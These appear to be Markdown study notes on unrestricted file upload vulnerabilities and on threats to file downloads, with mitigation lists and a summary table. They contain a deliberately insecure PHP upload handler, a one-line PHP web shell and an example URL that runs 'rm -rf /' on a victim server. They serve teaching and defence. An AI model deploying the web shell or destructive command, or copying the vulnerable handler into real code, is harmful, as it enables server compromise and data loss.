# Insecure (Unrestricted) File Uploads

## Unrestricted File Uploads over HTTP
- The ability to upload files with a "dangerous" type
- The ability to execute uploaded files within the server environment
- Can also be about:
	- Lack of file size check
	- Ability to upload any number of files 
		- These are both resource hogging issues and in a different category

## File Upload Vulnerability Origins
- Improper validation during file upload
- Incorrect handling of file after upload
- Keeping uploaded files in a web accessible location

### Typical File Upload Example Code
```php
//upload.html
<form action="upload.php" method="post" enctype="multipart/form-data">  
	Pick a file: <input type="file" name="filename"><br>
	<input type="submit" value="Submit">
</form>

//upload.php
<?php
	$location = "files/";
	$location .= basename($_FILES['filename']['name']);
	move_uploaded_file($_FILES['filename']['tmp_name'], $location);
?>
//Note: The web server must have write permissions on the destination  directory
```

## Exploitation of File Upload Vulnerabilities
Sample exploitation:
```php
//Attacker uploads attack.php
<?php passthru($_GET[‘cmd’]); ?>

//Attacker requests the following url: 
http://www.victim.com/files/attack.php?cmd=rm%20-rf%2f
```

## File Upload Vulnerability Mitigations
- Check the file type 
	- Check headers, `file` command. **CAUTION!!!!**
	- Try to open file with an application and **a virus scanner**
- Parse file, remove info and discard file, as well as **XSS check**
- Change filename + extension
- Refer to file by ID and use a lookup table
- Don't store file in **www root**
- No exec on upload directories, can **consider partition-level controls**

## Threats against File Downloads
- Denial of service through resource exhaustion
	- The largest file on your website is requested thousands or even millions of times, slowing or eventually halting the server's response
	- "The largest publicly available file on your site is the one that will be used to DoS you"
- Man-in-the-Middle
	- Files are intercepted and altered maliciously
- Corrupted source file
	- Attacker replaces original file with a malicious copy

## Securing File Downloads
- Denial of service through resource exhaustion
	- Use a content delivery network (CDN) to host downloadable static content 
	- Use a caching server that serves content from memory, not disk
	- Restrict access to large file downloads to authorized users, don't make the files public
	- Download quotas or throttling
- Man-in-the-Middle
	- Serve files over a protected SSL/TLS connection
	- Post file hash alongside download link
- Corrupted source file
	- Local file integrity checks (`tripwire` command)


|                                | DoS attacks                                                                                                                                                                                                                                                                     | Man-in-the-Middle                                                                             | Corrupted Source File                                 |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- | ----------------------------------------------------- |
| Threats against File Downloads | The largest file on your website is requested thousands or even millions of times, slowing or eventually halting the server's response                                                                                                                                          | Files are intercepted and altered maliciously                                                 | Attacker replaces original file with a malicious copy |
| Securing File Downloads        | - Use a content delivery network (CDN) to host downloadable static content<br>- Use a caching server that serves content from memory, not disk<br>- Restrict access to large file downloads to authorized users, don't make the files public<br>- Download quotas or throttling | - Serve files over a protected SSL/TLS connection<br>- Post file hash alongside download link | Local file integrity checks (`tripwire` command)      |
|                                |                                                                                                                                                                                                                                                                                 |                                                                                               |                                                       |
